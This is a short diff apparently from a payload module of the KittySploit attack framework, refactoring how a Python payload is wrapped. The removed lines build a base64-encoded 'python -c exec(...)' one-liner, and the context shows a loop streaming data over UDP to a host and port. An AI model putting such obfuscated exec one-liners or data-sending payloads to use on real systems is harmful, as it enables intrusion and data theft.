@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import base64
-
 from kittysploit import *
 
 
@@ -44,6 +42,4 @@ while True:
     for i in range(0,len(b),1200):
         s.sendto(b[i:i+1200],(H,P))
 '''
-        enc = base64.b64encode(script.encode()).decode("ascii")
-        py = str(self.python_binary or "python3")
-        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
+        return self._encode_python_one_liner(script, self.python_binary)
